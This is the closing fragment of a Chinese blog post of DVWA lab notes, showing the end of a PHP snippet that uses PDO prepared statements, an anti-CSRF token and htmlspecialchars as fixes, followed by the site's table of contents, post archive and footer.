$data-&gt;bindParam( &#39;:message&#39;, $message, PDO::PARAM_STR ); 
$data-&gt;bindParam( &#39;:name&#39;, $name, PDO::PARAM_STR ); 
$data-&gt;execute(); 
} 
// Generate Anti-CSRF token 
generateSessionToken(); 
?&gt;
</code></pre><p>使用htmlspecialchars函数，解决了XSS</p>
</、>
    </article>
    <!-- license  -->
    
        <div class="license-wrapper">
            <p>Author：<a href="http://mang0.me">Mang0</a>
            <p>原文链接：<a href="http://mang0.me/2017/11/22/DVWA笔记/">http://mang0.me/2017/11/22/DVWA笔记/</a>
            <p>发表日期：<a href="http://mang0.me/2017/11/22/DVWA笔记/">November 22nd 2017, 5:06:26 pm</a>
            <p>更新日期：<a href="http://mang0.me/2017/11/22/DVWA笔记/">October 9th 2018, 4:40:06 pm</a>
            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
        </div>
    
    <!-- paginator  -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href= "/2017/11/22/17-11反思与进取/" title= "17-11反思与进取">
                    <div class="nextTitle">17-11反思与进取</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href= "/2017/11/22/hexo博客搭建/" title= "hexo博客搭建">
                    <div class="prevTitle">hexo博客搭建</div>
                </a>
            
        </li>
    </ul>
    <!-- 评论插件 -->
    <!-- 来必力City版安装代码 -->

<!-- City版安装代码已完成 -->
    
    
    <!-- partial('_partial/comment/changyan') -->
    <!--PC版-->


    
    

    <!-- 评论 -->
</main>
            <!-- profile -->
            
        </div>
        <footer class="footer footer-unloaded">
    <!-- social  -->
    
    <div class="social">
        
    
        
            
                <a href="mailto:951207194@qq.com" class="iconfont-archer email" title=email ></a>
            
        
    
        
            
                <a href="//github.com/0xMJ" class="iconfont-archer github" target="_blank" title=github></a>
            
        
    
        
            
                <span class="iconfont-archer wechat" title=wechat>
                  
                  <img class="profile-qr" src="/assets/weixin.jpg" />
                </span>
            
        
    
        
    
        
    
        
            
                <a href="http://weibo.com/u/3606330100/" class="iconfont-archer weibo" target="_blank" title=weibo></a>
            
        
    
        
    
        
    
        
    
        
    
        
            
                <a href="https://www.instagram.com/1_be_winner/" class="iconfont-archer instagram" target="_blank" title=instagram></a>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
            
                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
            
        
    

    </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- 不蒜子  -->
    
    <div class="busuanzi-container">
    
     
    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
    
    </div>
    
</footer>
    </div>
    <!-- toc -->
    
    <div class="toc-wrapper" style=
    







top:50vh;

    >
        <div class="toc-catalog">
            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
        </div>
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DVWA笔记"><span class="toc-number">1.</span> <span class="toc-text">DVWA笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一：搭建平台"><span class="toc-number">1.0.1.</span> <span class="toc-text">一：搭建平台</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二-Brute-Force"><span class="toc-number">1.0.2.</span> <span class="toc-text">二: Brute Force</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三-Command-Injection"><span class="toc-number">1.0.3.</span> <span class="toc-text">三:Command Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四：CSRF"><span class="toc-number">1.0.4.</span> <span class="toc-text">四：CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#五：文件包含漏洞"><span class="toc-number">1.0.5.</span> <span class="toc-text">五：文件包含漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#五：File-Upload"><span class="toc-number">1.0.6.</span> <span class="toc-text">五：File Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#七：Insecure-CAPTCHA"><span class="toc-number">1.0.7.</span> <span class="toc-text">七：Insecure CAPTCHA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#八：SQL-Injection（SQL注入）"><span class="toc-number">1.0.8.</span> <span class="toc-text">八：SQL Injection（SQL注入）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Medium："><span class="toc-number">1.0.8.0.1.</span> <span class="toc-text">Medium：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#九：SQL-Injection-Blind"><span class="toc-number">1.0.9.</span> <span class="toc-text">九：SQL Injection(Blind)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#十-反射型XSS"><span class="toc-number">1.0.10.</span> <span class="toc-text">十:反射型XSS</span></a></li></ol></li></ol></li></ol>
    </div>
    
    <div class="back-top iconfont-archer">&#xe639;</div>
    <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
          <div class="sidebar-panel-archives">
    <!-- 在ejs中将archive按照时间排序 -->
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <div class="total-and-search">
        <div class="total-archive">
        Total : 40
        </div>
        <!-- search  -->
        
    </div>
    
    <div class="post-archive">
    
    
    
    
    <div class="archive-year"> 2018 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/09</span><a class="archive-post-title" href= "/2018/10/09/机器学习概念/" >机器学习概念</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/09</span><a class="archive-post-title" href= "/2018/10/09/20个常用的正则表达式/" >20个常用的正则表达式</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/09</span><a class="archive-post-title" href= "/2018/10/09/浅谈内网渗透流程/" >浅谈内网渗透流程</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/安恒五月/" >安恒5月</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/安恒七月/" >安恒7月</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/墨者学院php代码审计1/" >墨者学院php代码审计1</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/PHP字符串-和“区别/" >PHP字符串'和“区别</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/01</span><a class="archive-post-title" href= "/2018/08/01/渗透测试基础/" >渗透测试基础</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/01</span><a class="archive-post-title" href= "/2018/08/01/八月展望/" >八月展望</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/20</span><a class="archive-post-title" href= "/2018/06/20/2018SCTF-wp/" >2018SCTF-wp</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/01</span><a class="archive-post-title" href= "/2018/06/01/cbc字节翻转攻击/" >cbc字节翻转攻击</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/28</span><a class="archive-post-title" href= "/2018/05/28/ISCC2018-writeup/" >ISCC2018-writeup</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/15</span><a class="archive-post-title" href= "/2018/05/15/全国网络空间安全技术大赛2018三道wp/" >全国网络空间安全技术大赛2018三道wp</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/01</span><a class="archive-post-title" href= "/2018/05/01/bugku-misc/" >bugku-misc</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/23</span><a class="archive-post-title" href= "/2018/04/23/Nmap-使用技巧汇总/" >Nmap 使用技巧汇总</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/23</span><a class="archive-post-title" href= "/2018/04/23/文件上传总结/" >文件上传总结</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/23</span><a class="archive-post-title" href= "/2018/04/23/php文件包含漏洞/" >php文件包含漏洞</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/23</span><a class="archive-post-title" href= "/2018/04/23/高级入侵/" >高级入侵</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/23</span><a class="archive-post-title" href= "/2018/04/23/DDCTF三道小结/" >DDCTF三道小结</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/02</span><a class="archive-post-title" href= "/2018/04/02/第二届强网杯-部分wp/" >第二届强网杯-部分wp</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/02</span><a class="archive-post-title" href= "/2018/04/02/sqli-labs5-6-盲注/" >sqli-labs5-6(盲注)</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/02</span><a class="archive-post-title" href= "/2018/04/02/信息收集/" >信息收集</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/02</span><a class="archive-post-title" href= "/2018/04/02/Sqli-labs-1-4/" >Sqli-labs  1-4</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/02</span><a class="archive-post-title" href= "/2018/04/02/实验吧web—writeup/" >实验吧web—writeup</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/02</span><a class="archive-post-title" href= "/2018/04/02/sqli-labs-less7-10/" >sqli-labs  less7-10</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/02</span><a class="archive-post-title" href= "/2018/04/02/sqli-labs-less11-15/" >sqli-labs less11-15</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/27</span><a class="archive-post-title" href= "/2018/02/27/kali渗透测试之Web渗透-扫描工具-Nikto/" >kali渗透测试之Web渗透-扫描工具-Nikto</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/27</span><a class="archive-post-title" href= "/2018/02/27/黑客攻防web安全实战详解/" >黑客攻防web安全实战详解</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/27</span><a class="archive-post-title" href= "/2018/02/27/kali渗透测试之Web渗透-扫描工具-Vega/" >kali渗透测试之Web渗透-扫描工具-Vega</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/27</span><a class="archive-post-title" href= "/2018/02/27/kali渗透测试之Web渗透-扫描工具-QWASP-ZAP/" >kali渗透测试之Web渗透-扫描工具-QWASP_ZAP</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/27</span><a class="archive-post-title" href= "/2018/02/27/kali渗透测试之Web渗透-工具-NETCAT/" >kali渗透测试之Web渗透-工具-NETCAT</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/27</span><a class="archive-post-title" href= "/2018/02/27/kali渗透测试之Web渗透-扫描工具-Skipfish/" >kali渗透测试之Web渗透-扫描工具-Skipfish</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/27</span><a class="archive-post-title" href= "/2018/02/27/kali渗透测试之Web渗透-工具-TCPDUMP/" >kali渗透测试之Web渗透-工具-TCPDUMP</a>
        </li>
    
    
    
    
    
        </ul>
    
    <div class="archive-year"> 2017 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/15</span><a class="archive-post-title" href= "/2017/12/15/Vim简单入门笔记/" >Vim简单入门笔记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/22</span><a class="archive-post-title" href= "/2017/11/22/DVWA笔记/" >DVWA笔记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/22</span><a class="archive-post-title" href= "/2017/11/22/17-11反思与进取/" >17-11反思与进取</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/22</span><a class="archive-post-title" href= "/2017/11/22/hexo博客搭建/" >hexo博客搭建</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/21</span><a class="archive-post-title" href= "/2017/11/21/SQLMAP注入教程-11种常见SQLMAP使用方法详解/" >SQLMAP注入教程-11种常见SQLMAP使用方法详解</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/20</span><a class="archive-post-title" href= "/2017/10/20/第八届Geek部分web/" >第八届Geek部分web</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/27</span><a class="archive-post-title" href= "/2017/09/27/Hello World /" >my-first-blog</a>
        </li>
    
    </div>
  </div>
        <div class="sidebar-panel-tags">
    <div class="sidebar-tags-name">
    
        <span class="sidebar-tag-name" data-tags="sqlilabs"><span class="iconfont-archer">&#xe606;</span>sqlilabs</span>
    
        <span class="sidebar-tag-name" data-tags="密码学"><span class="iconfont-archer">&#xe606;</span>密码学</span>
    
        <span class="sidebar-tag-name" data-tags="文件包含"><span class="iconfont-archer">&#xe606;</span>文件包含</span>
    
        <span class="sidebar-tag-name" data-tags="WP"><span class="iconfont-archer">&#xe606;</span>WP</span>
    
        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
    
        <span class="sidebar-tag-name" data-tags="文件上传"><span class="iconfont-archer">&#xe606;</span>文件上传</span>
    
        <span class="sidebar-tag-name" data-tags="信息收集"><span class="iconfont-archer">&#xe606;</span>信息收集</span>
    
        <span class="sidebar-tag-name" data-tags="渗透"><span class="iconfont-archer">&#xe606;</span>渗透</span>
    
        <span class="sidebar-tag-name" data-tags="内网"><span class="iconfont-archer">&#xe606;</span>内网</span>
    
        <span class="sidebar-tag-name" data-tags="入侵"><span class="iconfont-archer">&#xe606;</span>入侵</span>
    
        <span class="sidebar-tag-name" data-tags="思考"><span class="iconfont-archer">&#xe606;</span>思考</span>
    
        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
    
        <span class="sidebar-tag-name" data-tags="first-blog"><span class="iconfont-archer">&#xe606;</span>first-blog</span>
    
        <span class="sidebar-tag-name" data-tags="hexo"><span class="iconfont-archer">&#xe606;</span>hexo</span>
    
        <span class="sidebar-tag-name" data-tags="黑客攻防web安全实战详解"><span class="iconfont-archer">&#xe606;</span>黑客攻防web安全实战详解</span>
    
        <span class="sidebar-tag-name" data-tags="正则"><span class="iconfont-archer">&#xe606;</span>正则</span>
    
        <span class="sidebar-tag-name" data-tags="Nmap"><span class="iconfont-archer">&#xe606;</span>Nmap</span>
    
        <span class="sidebar-tag-name" data-tags="sqlmap"><span class="iconfont-archer">&#xe606;</span>sqlmap</span>
    
        <span class="sidebar-tag-name" data-tags="NETCAT"><span class="iconfont-archer">&#xe606;</span>NETCAT</span>
    
        <span class="sidebar-tag-name" data-tags="Nikto"><span class="iconfont-archer">&#xe606;</span>Nikto</span>
    
        <span class="sidebar-tag-name" data-tags="TCPDUMP"><span class="iconfont-archer">&#xe606;</span>TCPDUMP</span>
    
        <span class="sidebar-tag-name" data-tags="Skipfish"><span class="iconfont-archer">&#xe606;</span>Skipfish</span>
    
        <span class="sidebar-tag-name" data-tags="QWASP_ZAP"><span class="iconfont-archer">&#xe606;</span>QWASP_ZAP</span>
    
        <span class="sidebar-tag-name" data-tags="Vega"><span class="iconfont-archer">&#xe606;</span>Vega</span>
    
        <span class="sidebar-tag-name" data-tags="VIM"><span class="iconfont-archer">&#xe606;</span>VIM</span>
    
        <span class="sidebar-tag-name" data-tags="Dvwa"><span class="iconfont-archer">&#xe606;</span>Dvwa</span>
    
    </div>
    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
    缺失模块。<br/>
    1、请确保node版本大于6.2<br/>
    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
    3、在根目录_config.yml里添加配置：
    <pre style="color: #787878; font-size: 0.6rem;">
jsonContent:
  meta: false
  pages: false
  posts:
    title: true
    date: true
    path: true
    text: false
    raw: false
    content: false
    slug: false
    updated: false
    comments: false
    link: false
    permalink: false
    excerpt: false
    categories: true
    tags: true</pre>
    </div> 
    <div class="sidebar-tags-list"></div>
</div>
        <div class="sidebar-panel-categories">
    <div class="sidebar-categories-name">
    
        <span class="sidebar-category-name" data-categories="01-Web-Security"><span class="iconfont-archer">&#xe60a;</span>01-Web-Security</span>
    
        <span class="sidebar-category-name" data-categories="CTF"><span class="iconfont-archer">&#xe60a;</span>CTF</span>
    
        <span class="sidebar-category-name" data-categories="02-渗透测试"><span class="iconfont-archer">&#xe60a;</span>02-渗透测试</span>
    
        <span class="sidebar-category-name" data-categories="04-CTF"><span class="iconfont-archer">&#xe60a;</span>04-CTF</span>
    
        <span class="sidebar-category-name" data-categories="03-内网-红队"><span class="iconfont-archer">&#xe60a;</span>03-内网-红队</span>
    
        <span class="sidebar-category-name" data-categories="10-思考"><span class="iconfont-archer">&#xe60a;</span>10-思考</span>
    
        <span class="sidebar-category-name" data-categories="05-代码审计"><span class="iconfont-archer">&#xe60a;</span>05-代码审计</span>
    
        <span class="sidebar-category-name" data-categories="06-AI-AI-Security"><span class="iconfont-archer">&#xe60a;</span>06-AI-AI-Security</span>
    
        <span class="sidebar-category-name" data-categories="07-读书摘要"><span class="iconfont-archer">&#xe60a;</span>07-读书摘要</span>
    
        <span class="sidebar-category-name" data-categories="08-Language"><span class="iconfont-archer">&#xe60a;</span>08-Language</span>
    
        <span class="sidebar-category-name" data-categories="09-Kali"><span class="iconfont-archer">&#xe60a;</span>09-Kali</span>
    
        <span class="sidebar-category-name" data-categories="工具"><span class="iconfont-archer">&#xe60a;</span>工具</span>
    
        <span class="sidebar-category-name" data-categories="代码审计"><span class="iconfont-archer">&#xe60a;</span>代码审计</span>
    
        <span class="sidebar-category-name" data-categories="Web-Security"><span class="iconfont-archer">&#xe60a;</span>Web-Security</span>
    
        <span class="sidebar-category-name" data-categories="读书摘要"><span class="iconfont-archer">&#xe60a;</span>读书摘要</span>
    
        <span class="sidebar-category-name" data-categories="Kali"><span class="iconfont-archer">&#xe60a;</span>Kali</span>
    
        <span class="sidebar-category-name" data-categories="AI-AI-Security"><span class="iconfont-archer">&#xe60a;</span>AI-AI-Security</span>
    
        <span class="sidebar-category-name" data-categories="Language"><span class="iconfont-archer">&#xe60a;</span>Language</span>
    
        <span class="sidebar-category-name" data-categories="思考"><span class="iconfont-archer">&#xe60a;</span>思考</span>
    
        <span class="sidebar-category-name" data-categories="渗透测试"><span class="iconfont-archer">&#xe60a;</span>渗透测试</span>
    
        <span class="sidebar-category-name" data-categories="内网-红队"><span class="iconfont-archer">&#xe60a;</span>内网-红队</span>
    
    </div>
    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
    <div class="sidebar-categories-list"></div>
</div>
    </div>
</div> 
    <script>
    var siteMeta = {
        root: "/",
        author: "Mang0"
    }
</script>
    <!-- CDN failover -->
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
    <script type="text/javascript">
        if (typeof window.$ === 'undefined')
        {
            console.warn('jquery load from jsdelivr failed, will load local script')
            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
        }
    </script>
    <script src="/scripts/main.js"></script>
    <!-- algolia -->
    
    <!-- busuanzi  -->
    
    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    
    <!-- CNZZ  -->
    
    </div>
    <!-- async load share.js -->
    
        <script src="/scripts/share.js" async></script>    
     
    </body>
</html>


